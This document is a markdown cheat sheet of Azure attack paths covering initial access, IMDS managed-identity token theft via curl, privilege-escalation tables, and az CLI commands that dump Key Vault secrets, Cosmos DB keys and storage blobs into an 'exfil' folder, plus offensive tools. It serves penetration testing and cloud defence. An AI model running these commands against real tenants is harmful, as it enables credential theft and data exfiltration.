# Azure Attack Paths

## Initial Access Vectors

### Credential Discovery
- Azure AD app registration secrets in repos
- Storage account connection strings
- Managed Identity tokens via SSRF
- `.publishsettings` files (contain management certificates)
- ARM template parameters with secrets

### Unauthenticated Access
- Public blob containers: `https://<account>.blob.core.windows.net/<container>?restype=container&comp=list`
- Azure AD tenant enumeration: `https://login.microsoftonline.com/<domain>/.well-known/openid-configuration`
- Exposed Azure Functions (anonymous auth level)
- Azure DevOps public projects
- Key Vault with access policies allowing anonymous

### Metadata Service (IMDS)
```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Managed Identity token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Storage token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
```

## Privilege Escalation

### Azure AD / Entra ID
| Technique | Required Role/Permission | Impact |
|-----------|------------------------|--------|
| Global Admin via app consent | Application.ReadWrite.All | Full tenant control |
| Password reset | Privileged Authentication Admin | Take over any user |
| Add member to role | RoleManagement.ReadWrite.Directory | Self-elevate |
| App registration secret | Application.ReadWrite.OwnedBy | Impersonate app |
| Conditional Access bypass | Device compliance manipulation | Skip MFA |
| PIM activation | Eligible role assignment | Just-in-time admin |

### Azure RBAC
| Technique | Required Permission | Impact |
|-----------|-------------------|--------|
| Custom role creation | `Microsoft.Authorization/roleDefinitions/write` | Create admin-equivalent role |
| Role assignment | `Microsoft.Authorization/roleAssignments/write` | Grant self any role |
| Management group escalation | Management Group Contributor | Control all subscriptions |
| Automation RunAs account | Access to Automation Account | Execute as service principal |
| Logic App managed identity | Logic App Contributor | Execute as MI |

### Cross-Tenant
- B2B guest user escalation
- Multi-tenant app registration abuse
- Federated identity credential manipulation
- Partner Center API abuse

## Data Exfiltration

### Storage Accounts
```bash
# List containers
az storage container list --account-name <name> --auth-mode login
# Download blobs
az storage blob download-batch -d ./exfil -s <container> --account-name <name>
# Check for SAS tokens in logs/configs
grep -rE "sv=20[0-9]{2}-[0-9]{2}-[0-9]{2}&s[a-z]=" .
```

### Key Vault
```bash
az keyvault list
az keyvault secret list --vault-name <name>
az keyvault secret show --vault-name <name> --name <secret>
az keyvault key list --vault-name <name>
az keyvault certificate list --vault-name <name>
```

### SQL Database
```bash
az sql server list
az sql db list --server <server> --resource-group <rg>
# Connection with stolen credentials
sqlcmd -S <server>.database.windows.net -U <user> -P <pass> -d <db>
```

### Cosmos DB
```bash
az cosmosdb keys list --name <account> --resource-group <rg>
# Primary key = full read/write access to all data
```

## AKS-Specific

```bash
# Get cluster credentials
az aks get-credentials --resource-group <rg> --name <cluster>
# Check RBAC mode
az aks show --resource-group <rg> --name <cluster> --query "aadProfile"
# Pod identity / workload identity
kubectl get azureidentity -A
kubectl get serviceaccount -A -o json | jq '.items[] | select(.metadata.annotations["azure.workload.identity/client-id"])'
```

## Tools

| Tool | Purpose |
|------|---------|
| ROADtools | Azure AD enumeration and exploitation |
| AzureHound | BloodHound data collection for Azure |
| MicroBurst | Azure security assessment |
| ScoutSuite | Multi-cloud auditing |
| PowerZure | Azure exploitation |
| Steampipe | SQL queries against Azure APIs |
| TokenTactics | Azure AD token manipulation |
| GraphRunner | Microsoft Graph API exploitation |
